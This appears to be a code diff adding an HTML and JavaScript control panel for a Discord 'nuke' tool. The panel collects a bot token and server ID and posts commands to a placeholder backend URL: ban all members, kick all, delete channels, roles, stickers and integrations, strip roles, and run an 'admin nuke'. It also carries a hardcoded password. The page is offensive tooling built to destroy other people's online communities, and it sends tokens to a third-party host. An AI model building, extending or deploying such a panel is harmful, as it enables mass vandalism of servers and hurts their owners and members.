@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AL-KUWAITI PANEL</title>
+    <style>
+        :root { --red: #ff0000; --bg: #000; }
+        body { background: var(--bg); color: var(--red); font-family: sans-serif; margin: 0; overflow: hidden; text-transform: uppercase; }
+        
+        /* الدخولية */
+        #intro {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; justify-content: center; align-items: center;
+            z-index: 9999; text-align: center; font-weight: bold;
+        }
+        .fade-out { animation: fadeOut 2s forwards; }
+        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }
+
+        /* المحتوى */
+        .container { padding: 20px; max-width: 450px; margin: auto; display: none; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        input { width: 100%; padding: 12px; margin: 5px 0; background: #111; border: 1px solid #333; color: #fff; box-sizing: border-box; }
+        button { padding: 15px; background: #000; border: 1px solid var(--red); color: var(--red); cursor: pointer; font-weight: bold; letter-spacing: 1px; }
+        button:hover { background: var(--red); color: #000; }
+        .admin-btn { grid-column: span 2; background: #300; border-color: #f00; color: #fff; }
+
+        /* النوافذ */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { background: #0a0a0a; padding: 25px; border: 2px solid var(--red); width: 100%; max-width: 350px; }
+    </style>
+</head>
+<body>
+
+<div id="intro">
+    <h1 id="intro-text" style="font-size: 2.5rem;">by kuwaiti</h1>
+</div>
+
+<div class="container" id="main-content">
+    <h1 style="letter-spacing: 5px; text-shadow: 0 0 10px #f00;">AL-KUWAITI</h1>
+    <input type="text" id="token" placeholder="TOKEN">
+    <input type="text" id="guild_id" placeholder="GUILD ID">
+    <input type="password" id="admin_pwd" placeholder="ADMIN PASSWORD">
+
+    <div class="grid">
+        <button class="admin-btn" onclick="executeAdmin()">EXECUTE ADMIN NUKE</button>
+        <button onclick="openModal('full_nuke')">CUSTOM NUKE</button>
+        <button onclick="send('ban_all')">BAN ALL</button>
+        <button onclick="send('kick_all')">KICK ALL</button>
+        <button onclick="send('unban_all')">MASS UNBAN</button>
+        <button onclick="send('del_ch')">DELETE CHANNELS</button>
+        <button onclick="send('del_roles')">DELETE ROLES</button>
+        <button onclick="send('del_stickers')">DELETE STICKERS</button>
+        <button onclick="send('strip_all')">STRIP ROLES</button>
+        <button onclick="send('del_apps')">DELETE INTEGRATIONS</button>
+        <button onclick="openModal('nick_all')">CUSTOM NICK ALL</button>
+    </div>
+    <div id="status" style="margin-top: 20px; color: #555; font-size: 12px;">SYSTEM READY</div>
+</div>
+
+<div id="customModal" class="modal">
+    <div class="modal-content">
+        <h3 id="modal-title">SET OPTIONS</h3>
+        <input type="text" id="opt_name" placeholder="NAME">
+        <input type="text" id="opt_msg" placeholder="MESSAGE">
+        <input type="text" id="opt_icon" placeholder="IMAGE URL">
+        <input type="number" id="opt_count" placeholder="COUNT" value="50">
+        <div style="display:flex; gap:10px; margin-top:15px;">
+            <button style="flex:1;" onclick="submitCustom()">START</button>
+            <button style="flex:1; border-color:#444;" onclick="closeModal()">CANCEL</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const intro = document.getElementById('intro');
+    const introText = document.getElementById('intro-text');
+    const main = document.getElementById('main-content');
+
+    // الدخولية المطلوبة
+    setTimeout(() => {
+        introText.innerHTML = "kuwaiti👑<br>dynamite عضيدي👑<br>5499 👑👑";
+        setTimeout(() => {
+            intro.classList.add('fade-out');
+            main.style.display = 'block';
+            setTimeout(() => { intro.style.display = 'none'; }, 2000);
+        }, 6000);
+    }, 4000);
+
+    let currentCmd = "";
+    function openModal(cmd) { currentCmd = cmd; document.getElementById('customModal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('customModal').style.display = 'none'; }
+
+    async function send(cmd, extra = {}) {
+        const token = document.getElementById('token').value;
+        const guild = document.getElementById('guild_id').value;
+        const pwd = document.getElementById('admin_pwd').value;
+        
+        fetch('رابط_الاستضافة_حقك/execute', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ token, guild, command: cmd, password: pwd, ...extra })
+        });
+    }
+
+    function executeAdmin() {
+        const pwd = document.getElementById('admin_pwd').value;
+        if(pwd !== "kuwaiti#5499") return alert("ACCESS DENIED");
+        send('admin_nuke');
+    }
+
+    function submitCustom() {
+        const data = {
+            name: document.getElementById('opt_name').value,
+            msg: document.getElementById('opt_msg').value,
+            icon: document.getElementById('opt_icon').value,
+            count: document.getElementById('opt_count').value
+        };
+        send(currentCmd, data);
+        closeModal();
+    }
+</script>
+</body>
+</html>
